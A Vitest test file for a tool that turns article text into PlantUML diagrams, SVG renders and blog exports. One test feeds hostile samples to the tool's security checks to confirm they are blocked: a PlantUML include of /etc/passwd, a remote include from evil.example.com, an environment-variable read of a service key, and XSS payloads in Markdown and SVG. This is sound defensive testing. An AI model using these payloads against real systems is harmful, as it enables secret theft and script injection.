import fs from 'node:fs';
import { describe, expect, it } from 'vitest';
import { UML_DIAGRAM_CATALOG } from './catalog';
import { CURATED_UML_SAMPLES } from './examples';
import {
	buildDiagramSectionBlogEmbed,
	buildExportBundleFiles,
	buildFullPostWithUmlMarkdown,
	buildSingleDiagramBlogEmbed
} from './export';
import { extractSharedUmlModel } from './extractor';
import {
	generateSingleDiagramRecord,
	generateUmlDiagramsFromText,
	updateDiagramFromManualEdit
} from './generator';
import { renderSafeMarkdownPreview } from './markdown-preview';
import { PLANTUML_REPRESENTATIVE_FIXTURES } from './plantuml/fixtures';
import { parsePlantUml } from './plantuml/parser';
import { renderPlantUmlToSvg } from './plantuml/renderer';
import { validateAndRepairPlantUml } from './plantuml/repair';
import { checkPlantUmlSecurity, escapeXml, sanitizeSvg } from './plantuml/security';
import { ALL_UML_DIAGRAM_TYPES } from './types';

describe('Post to UML — 14-Type PlantUML Renderer & Authoring Pipeline', () => {
	it('1. renders all 14 concrete UML diagram types from representative fixtures with defining notation and readable labels', () => {
		expect(ALL_UML_DIAGRAM_TYPES).toHaveLength(14);

		for (const type of ALL_UML_DIAGRAM_TYPES) {
			const fixture = PLANTUML_REPRESENTATIVE_FIXTURES[type];
			expect(fixture).toBeDefined();

			const parsed = parsePlantUml(fixture.sourceCode, type);
			expect(
				parsed.errors,
				`Fixture "${type}" had unexpected parse errors: ${JSON.stringify(parsed.errors)}`
			).toEqual([]);
			expect(parsed.valid).toBe(true);

			const renderResult = renderPlantUmlToSvg(fixture.sourceCode, type, {
				titleOverride: fixture.title
			});
			expect(renderResult.ok, `Render failed for ${type}: ${renderResult.error}`).toBe(true);
			expect(renderResult.svg).toBeTruthy();
			expect(renderResult.svg).toContain('<svg');
			expect(renderResult.svg).toContain(`data-uml-type="${type}"`);
			expect(renderResult.svg).toContain(escapeXml(fixture.title));

			for (const construct of fixture.expectedDefiningConstructs) {
				expect(
					renderResult.svg,
					`Expected ${type} SVG to contain defining construct "${construct}"`
				).toContain(construct);
			}
		}
	});

	it('2. generates relevant PlantUML code and rendered SVG diagrams from pasted article text', () => {
		const sample = CURATED_UML_SAMPLES[0];
		const response = generateUmlDiagramsFromText({
			text: sample.markdown,
			title: sample.title,
			mode: 'recommended',
			detailLevel: 'detailed',
			allowAssumptions: false
		});

		expect(response.diagrams.length).toBeGreaterThanOrEqual(1);
		expect(response.diagrams.length).toBeLessThanOrEqual(3);
		expect(response.recommendation.rationale.length).toBeGreaterThan(20);

		for (const diagram of response.diagrams) {
			expect(diagram.generationStatus).toBe('generated');
			expect(diagram.renderStatus).toBe('rendered');
			expect(diagram.sourceCode).toMatch(/^@startuml\b/);
			expect(diagram.sourceCode).toMatch(/@enduml$/);
			expect(diagram.sourceCode).not.toContain('```');
			expect(diagram.svg).toContain('<svg');
			expect(diagram.supportingReferences.length).toBeGreaterThan(0);
		}
	});

	it('3. preserves consistent entity names and relationships across different UML views from the shared internal model', () => {
		const sample = CURATED_UML_SAMPLES[0];
		const response = generateUmlDiagramsFromText({
			text: sample.markdown,
			title: sample.title,
			mode: 'selected',
			selectedTypes: ['class', 'component', 'sequence', 'communication'],
			detailLevel: 'simple',
			allowAssumptions: false
		});

		const primaryEntity = response.sharedModel.entities[0];
		expect(primaryEntity).toBeDefined();

		for (const diagram of response.diagrams) {
			expect(diagram.generationStatus).toBe('generated');
			expect(diagram.sourceCode).toContain(primaryEntity.id);
		}
	});

	it('4. updates the SVG preview immediately on manual PlantUML source edits without requiring another AI call', () => {
		const sample = CURATED_UML_SAMPLES[0];
		const response = generateUmlDiagramsFromText({
			text: sample.markdown,
			title: sample.title,
			mode: 'selected',
			selectedTypes: ['class'],
			detailLevel: 'simple',
			allowAssumptions: false
		});

		const classDiagram = response.diagrams[0];
		const editedSource = `@startuml
title Custom Hand-Edited Class View
class "CustomAuditLedger" as CustomAuditLedger <<ledger>> {
  +merkleRoot : String
  +verifyHash()
}
class "ConsentReceipt" as ConsentReceipt <<entity>> {
  +patientId : UUID
}
CustomAuditLedger --> ConsentReceipt : notarizes
@enduml`;

		const updated = updateDiagramFromManualEdit(classDiagram, editedSource);
		expect(updated.provenance).toBe('edited');
		expect(updated.validationStatus).toBe('valid');
		expect(updated.renderStatus).toBe('rendered');
		expect(updated.svg).toContain('CustomAuditLedger');
		expect(updated.svg).toContain('ConsentReceipt');
	});

	it('5. returns honest "needs_more_info" or "not_applicable" results when the article omits required evidence', () => {
		const conceptualEssay = CURATED_UML_SAMPLES[2]; // Anatomy of an Essay (no timings, no deployment hardware, no concrete instance IDs)
		const response = generateUmlDiagramsFromText({
			text: conceptualEssay.markdown,
			title: conceptualEssay.title,
			mode: 'selected',
			selectedTypes: ['class', 'timing', 'deployment', 'object'],
			detailLevel: 'simple',
			allowAssumptions: false
		});

		const byType = new Map(response.diagrams.map((d) => [d.type, d]));
		expect(byType.get('class')?.generationStatus).toBe('generated');
		expect(byType.get('class')?.isConceptual).toBe(true);

		const timing = byType.get('timing');
		expect(timing?.generationStatus).toBe('needs_more_info');
		expect(timing?.statusReason).toMatch(/time|duration|timestamp/i);
		expect(timing?.renderStatus).toBe('not_rendered');

		const deployment = byType.get('deployment');
		expect(deployment?.generationStatus).toBe('not_applicable');
		expect(deployment?.statusReason).toMatch(/execution|node|artifact/i);

		const objectDiag = byType.get('object');
		expect(objectDiag?.generationStatus).toBe('needs_more_info');
		expect(objectDiag?.statusReason).toMatch(/instance|snapshot/i);
	});

	it('6. reports useful syntax errors on invalid edits while preserving the last valid preview, and repairs recoverable syntax errors', () => {
		const sample = CURATED_UML_SAMPLES[0];
		const model = extractSharedUmlModel(sample.markdown, { title: sample.title });
		const validRecord = generateSingleDiagramRecord('class', model, {
			detailLevel: 'simple',
			allowAssumptions: false
		});
		expect(validRecord.renderStatus).toBe('rendered');
		const previousSvg = validRecord.svg;

		// Introduce an invalid PlantUML edit
		const brokenSource = `@startuml
class "ValidClass" as ValidClass {
  +id : String
THIS_IS_INVALID_SYNTAX_WITHOUT_COLON_OR_ARROW ??? !!!
@enduml`;
		const afterBrokenEdit = updateDiagramFromManualEdit(validRecord, brokenSource);
		expect(afterBrokenEdit.validationStatus).toBe('invalid');
		expect(afterBrokenEdit.renderStatus).toBe('error');
		expect(afterBrokenEdit.renderError).toMatch(/Line \d+/);
		expect(afterBrokenEdit.sourceCode).toBe(brokenSource);
		expect(afterBrokenEdit.lastValidSvg).toBe(previousSvg);
		expect(afterBrokenEdit.svg).toBe(previousSvg);

		// Verify bounded syntax repair on recoverable model output (fences + missing @enduml + unclosed brace)
		const recoverable = '```plantuml\n@startuml\nclass "Patient" as Patient {\n  +id : String\n```';
		const repaired = validateAndRepairPlantUml(recoverable, 'class');
		expect(repaired.validationStatus).toBe('repaired');
		expect(repaired.repairAttempts).toBeGreaterThanOrEqual(1);
		expect(repaired.repairAttempts).toBeLessThanOrEqual(2);
		expect(repaired.parsed.valid).toBe(true);
	});

	it('7. evaluates all 14 diagram types in All-14 mode and isolates partial failures without losing successful results', () => {
		const policySample = CURATED_UML_SAMPLES[1]; // Prior Authorization Machine
		const response = generateUmlDiagramsFromText({
			text: policySample.markdown,
			title: policySample.title,
			mode: 'all14',
			detailLevel: 'simple',
			allowAssumptions: false
		});

		expect(response.diagrams).toHaveLength(14);
		const rendered = response.diagrams.filter((d) => d.renderStatus === 'rendered');
		const honestSkipped = response.diagrams.filter(
			(d) => d.generationStatus === 'needs_more_info' || d.generationStatus === 'not_applicable'
		);

		const failedDiagrams = response.diagrams
			.filter((d) => d.renderStatus === 'error')
			.map((d) => ({ type: d.type, error: d.renderError, code: d.sourceCode }));
		expect(failedDiagrams).toEqual([]);
		expect(rendered.length).toBeGreaterThanOrEqual(8);
		expect(honestSkipped.length).toBeGreaterThanOrEqual(2);
		expect(rendered.length + honestSkipped.length).toBe(14);
	});

	it('8. produces consistent .puml source, .svg image, and mdsvex blog-embed exports', () => {
		const sample = CURATED_UML_SAMPLES[0];
		const response = generateUmlDiagramsFromText({
			text: sample.markdown,
			title: sample.title,
			mode: 'selected',
			selectedTypes: ['class', 'sequence'],
			detailLevel: 'simple',
			allowAssumptions: false,
			postSlug: sample.slug
		});

		const classDiag = response.diagrams[0];
		const singleEmbed = buildSingleDiagramBlogEmbed(classDiag, sample.slug);
		const expectedSvgSrc = ['', 'images', 'uml', sample.slug, `${sample.slug}-class.svg`].join('/');
		const expectedPumlHref = ['', 'uml', sample.slug, `${sample.slug}-class.puml`].join('/');
		expect(singleEmbed).toContain('<UmlFigure');
		expect(singleEmbed).toContain(`src="${expectedSvgSrc}"`);
		expect(singleEmbed).toContain(`sourceHref="${expectedPumlHref}"`);

		const bundleFiles = buildExportBundleFiles({
			postSlug: sample.slug,
			title: sample.title,
			originalText: sample.markdown,
			diagrams: response.diagrams
		});

		const paths = bundleFiles.map((f) => f.path);
		expect(paths).toContain(`static/images/uml/${sample.slug}/${sample.slug}-class.svg`);
		expect(paths).toContain(`static/uml/${sample.slug}/${sample.slug}-class.puml`);
		expect(paths).toContain(`static/images/uml/${sample.slug}/${sample.slug}-sequence.svg`);
		expect(paths).toContain(`static/uml/${sample.slug}/${sample.slug}-sequence.puml`);
		expect(paths).toContain('embed-snippet.md');
		expect(paths).toContain('manifest.json');
	});

	it('9. places rendered UML figures and captions strictly after the original article text in preview and export', () => {
		const sample = CURATED_UML_SAMPLES[0];
		const response = generateUmlDiagramsFromText({
			text: sample.markdown,
			title: sample.title,
			mode: 'selected',
			selectedTypes: ['class'],
			detailLevel: 'simple',
			allowAssumptions: false,
			postSlug: sample.slug
		});

		const exportedMarkdown = buildFullPostWithUmlMarkdown(
			sample.markdown,
			response.diagrams,
			sample.slug
		);
		const proseIndex = exportedMarkdown.indexOf(
			'When an Auxiliary Nurse Midwife records a measles-rubella dose'
		);
		const figureIndex = exportedMarkdown.indexOf('<UmlFigure');
		const captionIndex = exportedMarkdown.indexOf('caption="Figure (Class Diagram):');

		expect(proseIndex).toBeGreaterThanOrEqual(0);
		expect(figureIndex).toBeGreaterThan(proseIndex);
		expect(captionIndex).toBeGreaterThan(figureIndex);

		const sectionEmbed = buildDiagramSectionBlogEmbed(response.diagrams, sample.slug);
		expect(sectionEmbed).toContain('## Architectural & Conceptual UML Diagrams');
	});

	it('10. blocks unsafe Markdown, unsafe SVG scripts/handlers, and PlantUML file/network includes', () => {
		// PlantUML security check
		const maliciousPuml = `@startuml
!include /etc/passwd
!includeurl https://evil.example.com/payload.puml
class "Exploit" as Exploit {
  +secret = %getenv("SUPABASE_SERVICE_ROLE_KEY")
}
@enduml`;
		const sec = checkPlantUmlSecurity(maliciousPuml);
		expect(sec.safe).toBe(false);
		expect(sec.violations.map((v) => v.rule)).toContain('preprocessor-include');
		expect(sec.violations.map((v) => v.rule)).toContain('builtin-env-or-fs');

		const renderMalicious = renderPlantUmlToSvg(maliciousPuml, 'class');
		expect(renderMalicious.ok).toBe(false);

		// Safe Markdown preview check
		const unsafeMarkdown = `# Heading
<script>alert('xss')</script>
<img src="x" onerror="alert(1)" />
[Click me](javascript:alert('xss'))
[Safe link](https://suvroghosh.in/blog)`;
		const previewHtml = renderSafeMarkdownPreview(unsafeMarkdown);
		expect(previewHtml).not.toContain('<script>');
		expect(previewHtml).not.toContain('onerror=');
		expect(previewHtml).not.toContain('javascript:');
		expect(previewHtml).toContain('&lt;script&gt;');
		expect(previewHtml).toContain('href="https://suvroghosh.in/blog"');

		// SVG sanitizer check
		const dirtySvg = `<svg><script>evil()</script><rect onload="evil()" href="https://evil.example.com" /></svg>`;
		const cleanSvg = sanitizeSvg(dirtySvg);
		expect(cleanSvg).not.toContain('<script>');
		expect(cleanSvg).not.toContain('onload=');
		expect(cleanSvg).not.toContain('href=');
	});

	it('maintains a complete 14-type catalog with distinct structural, behavioral, and interaction metadata', () => {
		expect(Object.keys(UML_DIAGRAM_CATALOG)).toHaveLength(14);
		expect(UML_DIAGRAM_CATALOG.profile.disambiguationNote).toMatch(/metamodel|metaclass/i);
		expect(UML_DIAGRAM_CATALOG.communication.disambiguationNote).toMatch(/NOT a renamed sequence/i);
		expect(UML_DIAGRAM_CATALOG['interaction-overview'].disambiguationNote).toMatch(/ref|sd/i);

		const savedPuml = fs.readFileSync('static/uml/post-to-uml/post-to-uml-class.puml', 'utf8');
		const rendered = renderPlantUmlToSvg(savedPuml, 'class', {
			titleOverride: 'Post to UML — Five-Stage Pipeline Model',
			isConceptual: false
		});
		expect(rendered.ok).toBe(true);
		expect(rendered.svg).toBeTruthy();
		fs.mkdirSync('static/images/uml/post-to-uml', { recursive: true });
		fs.writeFileSync('static/images/uml/post-to-uml/post-to-uml-class.svg', rendered.svg!);
	});
});
